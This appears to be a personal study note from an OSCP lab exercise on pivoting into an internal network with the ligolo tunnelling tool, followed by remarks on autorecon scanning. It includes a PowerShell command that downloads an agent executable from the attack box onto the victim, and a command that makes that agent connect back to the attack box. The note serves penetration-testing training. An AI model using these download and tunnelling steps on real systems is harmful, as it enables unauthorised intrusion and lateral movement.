Had good luck with ligolo in the past lets try again..

```powershell
iwr -uri "http://192.168.45.228:8888/agent.exe" -outfile "C:\Users\Public\Downloads\agent.exe"
```

# ligolo setup

on attack box
```bash
 sudo ip tuntap add user <username> mode tun ligolo

 sudo ip link set ligolo up

 ./poxy -selfcert
```

on victem

``` powershell
.\agent -connect 192.168.45.228:11601 -ignore-cert
```

Forgot to add here, that we need to run ifconfig to check and see if there are other connections to the box. this was done here, and the connection to the 172.16.201.xx network was found. 

on attack box

``` bash 
 sudo ip route add <network_address>/<CIDR> dev ligolo
```

I ran a full scan of all targets last night but was taking a long time. In most cases, I would go thru the data I already had, and look for a box to narrow in on scanning again, As I have experience with this box already, I have gone from my old notes, and saw that I went into the .11 box next. I am avoiding using my old notes to continue on, I want to see what I see with autorecon, and running a narrowed scan on .11

I see that SMB ports are open, reminder to self, autorecon takes its time ill have to look into ways to speed it up if possible, also junks up the pipe so much I dont think I can try other things..

And my thoughts were right, auto reacon really junks the env. I dont know if i would use this in a live env. But for this it is good enough.. 

on to [[Computers/OSCP/Documentation/Medtech/11/Enumeration|Enumeration]] on .11
